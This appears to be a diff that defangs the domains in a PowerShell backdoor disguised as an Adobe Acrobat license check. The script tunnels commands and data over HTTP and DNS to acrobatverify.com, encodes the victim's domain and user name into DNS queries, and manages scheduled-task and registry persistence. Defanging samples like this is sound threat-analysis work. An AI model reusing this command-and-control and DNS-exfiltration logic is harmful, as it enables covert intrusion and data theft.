@@ -105,7 +105,7 @@ function MA($key, $IV){
 
 # WebReq function is used to make web requests, it takes domain, request method, cookie, and body of the request and makes the request
 function WebReq($domain,$method,$cookieval,$body){
-    $url = 'https://www.'+$domain
+    $url = 'hxxp[://]www[.]'+$domain
     $ff= 0;
     while(1){
         $req = [System.Net.WebRequest]::Create($url);
@@ -140,7 +140,7 @@ function WebReq($domain,$method,$cookieval,$body){
         Catch{    
             if(!$ff){        
                 $ff=1        
-                $url = 'http://www.'+$domain    
+                $url = 'hxxp[://]www[.]'+$domain    
             }    
             else{        
                 try{            
@@ -199,10 +199,10 @@ function get-res($res,$rr){
     $tmp = [byte[]]$res[12..15][array]::Reverse($tmp)
     $count = [System.BitConverter]::ToUInt32($tmp,0)            
     for($i=0;$i -lt $count;$i++){    
-        $dname = 'www'+$i+'.'+$rr+".acrobatverify.com"  
+        $dname = 'www'+$i+'[.]'+$rr+"[.]acrobatverify[.]com"  
         $data += Query  $dname
     }
-    $dname = 'www.'+$rr+".acrobatverify.com"
+    $dname = 'www[.]'+$rr+"[.]acrobatverify[.]com"
     $res = Query $dname
     $f = [array]::IndexOf($data,[byte]124)            
     if( $f -ne -1 ){    
@@ -223,18 +223,18 @@ function get-res($res,$rr){
 function DNS-Con($dmode,$cookieavl,$pdata){
     $rr = (Get-Random -Min 100000 -Max 999999).ToString()
     if($dmode -eq 0){    
-        $dname = 'mail.'+$rr+'.acrobatverify.com '   
+        $dname = 'mail[.]'+$rr+'[.]acrobatverify[.]com '   
         $res = Query $dname    
         $sdata = $env:USERDOMAIN+'\'+$env:USERNAME + ':pass'    
         $id = [System.Text.Encoding]::ASCII.GetBytes($sdata)    
         $did = EB64 $id    
-        $dname = $did+'.'+$rr+'.acrobatverify.com'
+        $dname = $did+'[.]'+$rr+'[.]acrobatverify[.]com'
     }
     
     else{
-        $dname = 'ns1.'+$rr+'.acrobatverify.com'  
+        $dname = 'ns1[.]'+$rr+'[.]acrobatverify[.]com'  
         $res = Query $dname    
-        $dname = $cookieavl+'.'+$rr+'.acrobatverify.com'    
+        $dname = $cookieavl+'[.]'+$rr+'[.]acrobatverify[.]com'    
         $res = Query $dname    
         if($dmode -eq 2){        
             $count = [int][math]::Ceiling($pdata.length/60)        
@@ -243,11 +243,11 @@ function DNS-Con($dmode,$cookieavl,$pdata){
                 if($pn -eq $count-1 -and $pdata.length%60 -gt 0)            {
                     $size=$pdata.length%60
                 }            
-                $dname = $pdata.substring(($pn*60),$size)+'.'+$rr+'.+acrobatverify.com'
+                $dname = $pdata.substring(($pn*60),$size)+'.'+$rr+'.+acrobatverify[.]com'
                 $res = Query $dname        
             }    
         }    
-        $dname = 'ns2.'+$rr+'.acrobatverify.com'
+        $dname = 'ns2[.]'+$rr+'[.]acrobatverify[.]com'
     }
     
     $res = Query $dname
@@ -298,7 +298,7 @@ if( $val ){
 $dns=0
 
 if(!$sessvar){    
-    $http_res =  WebReq "acrobatverify.com" "GET"    
+    $http_res =  WebReq "acrobatverify[.]com" "GET"    
     $dns=0    
     if( $http_res -eq 0){        
         $dns = 1        
@@ -320,7 +320,7 @@ if(!$sessvar){
 }
 
 Try{
-    $http_res = WebReq "acrobatverify.com" "GET" $sessvar
+    $http_res = WebReq "acrobatverify[.]com" "GET" $sessvar
     $dns=0
     if( $http_res -eq 0){    
         $dns = 1    
@@ -358,7 +358,7 @@ Try{
         $uuid = $data[5..40] 
         $type = [System.Text.Encoding]::ASCII.GetString($data[41]) 
         $d = $data[42..$data.length]    
-        $prevdomain = "acrobatverify.com"    
+        $prevdomain = "acrobatverify[.]com"    
         if($type -eq 'x'){        
             cmd /c start /b schtasks /delete  /tn "AdobeAcrobatLicenseVerify" /f        Remove-ItemProperty -path "hkcu:\" -Name "AdobeAcrobatLicenseVerify"     [System.IO.File]::WriteAllBytes($MyInvocation.MyCommand.Definition,$d[0..$d.length] )        
             
